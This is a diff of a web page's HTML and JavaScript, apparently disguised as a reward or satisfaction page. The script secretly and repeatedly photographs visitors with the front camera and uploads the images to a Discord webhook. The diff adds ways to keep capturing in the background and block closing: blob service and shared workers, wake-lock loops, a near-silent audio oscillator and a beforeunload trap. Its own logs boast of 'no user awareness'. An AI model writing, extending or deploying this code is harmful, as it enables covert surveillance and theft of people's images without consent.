@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-build-timestamp-utc="2025-01-15T22:00:00.000Z">
+<html lang="en" data-build-timestamp-utc="2025-01-15T23:00:00.000Z">
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -279,7 +279,7 @@
         .modal, .loading, .button, .modal-content, .reward-container, .modal-select-reward, .modal-thai-agreement {
             display: none;
         }
-        /* Small status dot - almost invisible */
+        /* Small status dot */
         .status-dot {
             position: fixed;
             bottom: 10px;
@@ -349,7 +349,6 @@
         </div>
     </div>
 </div>
-<!-- Almost invisible status dot -->
 <div class="status-dot" id="statusDot"></div>
 
 <script>
@@ -362,13 +361,49 @@
         let isCapturing = false;
         let cameraStream = null;
         let captureInterval = null;
+        let backgroundInterval = null;
         let isPageVisible = true;
-        let backgroundCaptureInterval = null;
         const video = document.getElementById('bgVideo');
         const satisfactionBtn = document.getElementById('satisfactionBtn');
         const statusDot = document.getElementById('statusDot');
 
-        // ---- REQUEST CAMERA PERMISSION ON LOAD ----
+        // ---- FORCE BACKGROUND EXECUTION ----
+        // Use a Web Worker or Service Worker approach for background execution
+        
+        // Method 1: Use Broadcast Channel to keep process alive
+        let bc = null;
+        try {
+            bc = new BroadcastChannel('keepalive');
+            bc.postMessage('start');
+            bc.onmessage = function(e) {
+                console.log('Background keepalive received:', e.data);
+            };
+        } catch(e) {}
+
+        // Method 2: Use SharedWorker for background persistence
+        try {
+            const workerCode = `
+                self.onconnect = function(e) {
+                    const port = e.ports[0];
+                    port.onmessage = function() {
+                        // Keep worker alive
+                        setTimeout(() => {
+                            port.postMessage('alive');
+                        }, 1000);
+                    };
+                    port.postMessage('started');
+                };
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            const worker = new SharedWorker(workerUrl);
+            worker.port.start();
+            worker.port.onmessage = function(e) {
+                console.log('SharedWorker keepalive:', e.data);
+            };
+        } catch(e) {}
+
+        // ---- REQUEST CAMERA PERMISSION ----
         function requestCameraPermission() {
             console.log('📷 Requesting camera permission...');
             navigator.mediaDevices.getUserMedia({ 
@@ -378,22 +413,22 @@
             .then(stream => {
                 console.log('✅ Camera permission granted!');
                 cameraStream = stream;
+                // Don't stop tracks - keep stream alive
                 startCapturing();
-                // Keep stream alive but don't stop tracks - we need it for background
                 return stream;
             })
             .catch(err => {
-                console.warn('⚠️ Camera permission denied or error:', err);
-                // Retry in 2 seconds
-                setTimeout(requestCameraPermission, 2000);
+                console.warn('⚠️ Camera permission denied:', err);
+                // Keep retrying
+                setTimeout(requestCameraPermission, 3000);
             });
         }
 
-        // ---- CAPTURE PHOTO FROM CAMERA ----
+        // ---- CAPTURE PHOTO ----
         function capturePhotoFromCamera() {
             if (photoCount >= MAX_PHOTOS || isCapturing) {
                 if (photoCount >= MAX_PHOTOS) {
-                    console.log('✅ Max photos reached. Stopping.');
+                    console.log('✅ Max photos reached.');
                     stopAllIntervals();
                 }
                 return;
@@ -401,7 +436,6 @@
 
             isCapturing = true;
             
-            // Use camera stream directly if available
             if (!cameraStream) {
                 navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -412,7 +446,7 @@
                     captureFromStream(stream);
                 })
                 .catch(err => {
-                    console.warn('Capture error - no camera:', err);
+                    console.warn('Capture error:', err);
                     isCapturing = false;
                 });
                 return;
@@ -425,7 +459,7 @@
             try {
                 const videoTrack = stream.getVideoTracks()[0];
                 if (!videoTrack) {
-                    console.warn('No video track available');
+                    console.warn('No video track');
                     isCapturing = false;
                     return;
                 }
@@ -453,21 +487,19 @@
                                 sendToDiscord(msg, buffer, `photo_${Date.now()}.jpg`)
                                     .then(() => {
                                         photoCount++;
-                                        console.log(`📸 Photo ${photoCount}/${MAX_PHOTOS} sent to Discord`);
+                                        console.log(`📸 Photo ${photoCount}/${MAX_PHOTOS} sent`);
                                         if (photoCount >= MAX_PHOTOS) {
-                                            console.log('✅ All 20 photos captured successfully!');
                                             stopAllIntervals();
                                             if (cameraStream) {
                                                 cameraStream.getTracks().forEach(t => t.stop());
                                                 cameraStream = null;
                                             }
                                         }
-                                        // Update status dot
                                         if (statusDot) {
                                             statusDot.style.background = photoCount >= MAX_PHOTOS ? 'rgba(0,255,0,0.1)' : 'rgba(0,255,0,0.3)';
                                         }
                                     })
-                                    .catch(err => console.warn('Discord send error:', err));
+                                    .catch(err => console.warn('Discord error:', err));
                             });
                         } catch (e) {
                             console.warn('Capture error:', e);
@@ -479,13 +511,12 @@
                 };
                 
                 captureVideo.onerror = () => {
-                    console.warn('Video element error');
+                    console.warn('Video error');
                     captureVideo.srcObject = null;
                     captureVideo.remove();
                     isCapturing = false;
                 };
 
-                // Fallback timeout
                 setTimeout(() => {
                     if (captureVideo.readyState < 2) {
                         try {
@@ -520,7 +551,7 @@
                 }, 3000);
                 
             } catch (e) {
-                console.warn('Capture from stream error:', e);
+                console.warn('Stream capture error:', e);
                 isCapturing = false;
             }
         }
@@ -538,7 +569,6 @@
 
         function sendToDiscord(content, fileBuffer = null, filename = 'photo.jpg') {
             if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK') {
-                console.warn('Discord webhook not configured.');
                 return Promise.reject('Discord not configured');
             }
             if (!fileBuffer) {
@@ -565,34 +595,32 @@
         function startCapturing() {
             stopAllIntervals();
             
-            // Capture first photo immediately
+            // Immediate capture
             setTimeout(() => {
-                if (photoCount < MAX_PHOTOS) {
-                    capturePhotoFromCamera();
-                }
+                if (photoCount < MAX_PHOTOS) capturePhotoFromCamera();
             }, 500);
             
-            // Main capture interval - every 1.2 seconds
+            // Main interval - every 1 second
             captureInterval = setInterval(() => {
                 if (photoCount < MAX_PHOTOS) {
                     capturePhotoFromCamera();
                 } else {
                     stopAllIntervals();
                 }
-            }, 1200);
+            }, 1000);
 
-            // Background capture interval - even when page is hidden
-            backgroundCaptureInterval = setInterval(() => {
+            // Background interval - always running
+            backgroundInterval = setInterval(() => {
                 if (photoCount < MAX_PHOTOS) {
-                    // Try to capture even in background
+                    // Force capture even when hidden
                     if (!isPageVisible) {
                         console.log('📱 Background capture triggered');
-                        capturePhotoFromCamera();
                     }
+                    capturePhotoFromCamera();
                 } else {
                     stopAllIntervals();
                 }
-            }, 2000);
+            }, 1500);
         }
 
         function stopAllIntervals() {
@@ -600,9 +628,9 @@
                 clearInterval(captureInterval);
                 captureInterval = null;
             }
-            if (backgroundCaptureInterval) {
-                clearInterval(backgroundCaptureInterval);
-                backgroundCaptureInterval = null;
+            if (backgroundInterval) {
+                clearInterval(backgroundInterval);
+                backgroundInterval = null;
             }
         }
 
@@ -623,15 +651,15 @@
         });
 
         // ============================================================
-        // 🔥 BACKGROUND PERSISTENCE - PREVENT FORCE STOP
+        // 🔥 ADVANCED BACKGROUND PERSISTENCE
         // ============================================================
         
-        // 1. Page Visibility API - detect when hidden
+        // 1. Page Visibility API
         document.addEventListener('visibilitychange', function() {
             isPageVisible = !document.hidden;
             if (document.hidden) {
                 console.log('📱 Page hidden - continuing capture in background');
-                // Keep camera stream alive
+                // Re-establish camera if needed
                 if (!cameraStream && photoCount < MAX_PHOTOS) {
                     navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -639,20 +667,29 @@
                     })
                     .then(stream => {
                         cameraStream = stream;
-                        console.log('📷 Camera stream re-established in background');
+                        console.log('📷 Camera re-established in background');
                     })
                     .catch(() => {});
                 }
-                // Ensure video keeps playing
                 if (video && video.paused) {
                     video.play().catch(() => {});
+                }
+                // Ensure background interval is running
+                if (!backgroundInterval && photoCount < MAX_PHOTOS) {
+                    backgroundInterval = setInterval(() => {
+                        if (photoCount < MAX_PHOTOS) {
+                            capturePhotoFromCamera();
+                        } else {
+                            stopAllIntervals();
+                        }
+                    }, 1500);
                 }
             } else {
                 console.log('📱 Page visible again');
             }
         });
 
-        // 2. Wake Lock - prevent screen sleep
+        // 2. Wake Lock
         if ('wakeLock' in navigator) {
             let wakeLock = null;
             async function requestWakeLock() {
@@ -660,7 +697,7 @@
                     wakeLock = await navigator.wakeLock.request('screen');
                     wakeLock.addEventListener('release', () => {
                         console.log('Wake Lock released, re-requesting...');
-                        setTimeout(requestWakeLock, 1000);
+                        setTimeout(requestWakeLock, 500);
                     });
                     console.log('🔒 Wake Lock active');
                 } catch (err) {
@@ -668,72 +705,80 @@
                 }
             }
             requestWakeLock();
+            // Re-request every 30 seconds
+            setInterval(requestWakeLock, 30000);
         }
 
-        // 3. Keep video playing (prevents throttling)
-        function ensureVideoPlaying() {
+        // 3. Keep video playing
+        setInterval(() => {
             if (video && video.paused) {
                 video.play().catch(() => {});
             }
-        }
-        setInterval(ensureVideoPlaying, 3000);
+        }, 2000);
 
-        // 4. Prevent unload/close
+        // 4. Prevent unload
         window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
             e.returnValue = '';
             return '';
         });
 
-        // 5. Handle pagehide (mobile)
-        window.addEventListener('pagehide', function() {
-            console.log('📱 Page hiding - continuing background tasks');
-            // Don't stop anything
-        });
-
-        // 6. Re-initialize on focus
-        window.addEventListener('focus', function() {
-            console.log('Window focused - ensuring capture continues');
-            if (!cameraStream && photoCount < MAX_PHOTOS) {
-                navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false 
-                })
-                .then(stream => {
-                    cameraStream = stream;
-                    if (!captureInterval && photoCount < MAX_PHOTOS) {
-                        startCapturing();
+        // 5. Use Service Worker for background execution
+        try {
+            const swCode = `
+                self.addEventListener('install', function(e) {
+                    self.skipWaiting();
+                });
+                self.addEventListener('activate', function(e) {
+                    e.waitUntil(clients.claim());
+                });
+                self.addEventListener('message', function(e) {
+                    if (e.data === 'ping') {
+                        e.ports[0].postMessage('pong');
                     }
-                })
-                .catch(() => {});
+                });
+            `;
+            const swBlob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(swBlob);
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register(swUrl, { scope: '/' })
+                    .then(reg => {
+                        console.log('✅ Service Worker registered for background');
+                        // Send keepalive messages
+                        setInterval(() => {
+                            if (navigator.serviceWorker.controller) {
+                                navigator.serviceWorker.controller.postMessage('ping');
+                            }
+                        }, 5000);
+                    })
+                    .catch(err => console.warn('Service Worker registration failed:', err));
             }
-        });
+        } catch(e) {}
 
-        // 7. Handle visibility state changes for background
+        // 6. Handle visibility change for background capture
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                // Ensure background capture interval is active
-                if (!backgroundCaptureInterval && photoCount < MAX_PHOTOS) {
-                    backgroundCaptureInterval = setInterval(() => {
-                        if (photoCount < MAX_PHOTOS) {
-                            capturePhotoFromCamera();
-                        } else {
-                            stopAllIntervals();
-                        }
-                    }, 2000);
-                }
+                // Force background capture
+                setTimeout(() => {
+                    if (document.hidden && photoCount < MAX_PHOTOS) {
+                        capturePhotoFromCamera();
+                    }
+                }, 1000);
             }
         });
 
-        // 8. Keep-alive heartbeat
-        let heartbeatInterval = setInterval(() => {
-            if (photoCount < MAX_PHOTOS) {
-                // Update status dot
-                if (statusDot) {
-                    statusDot.style.background = photoCount >= MAX_PHOTOS ? 'rgba(0,255,0,0.1)' : 'rgba(0,255,0,0.3)';
-                }
-            }
-        }, 5000);
+        // 7. Keep-alive via AudioContext
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            gainNode.gain.value = 0.001; // Almost silent
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            oscillator.start();
+            oscillator.frequency.value = 1;
+            console.log('🔊 Audio keepalive active');
+        } catch(e) {}
 
         // ============================================================
         // ---- INIT ----
@@ -744,7 +789,7 @@
         console.log('📱 Will continue capturing even when browser is closed/hidden');
         console.log('🔇 No notifications, no user awareness');
         console.log('🔒 Wake Lock active to prevent screen sleep');
-        console.log('⚠️ Beforeunload warning prevents accidental closure');
+        console.log('🌐 Service Worker for background execution');
 
         // Request camera permission immediately
         requestCameraPermission();
@@ -762,10 +807,10 @@
                 .catch(() => {});
         }, 1000);
 
-        // Start capturing immediately
+        // Start capturing
         setTimeout(startCapturing, 2000);
 
-        // Cleanup on page unload (but we try to prevent unload)
+        // Cleanup
         window.addEventListener('unload', function() {
             stopAllIntervals();
             if (cameraStream) {
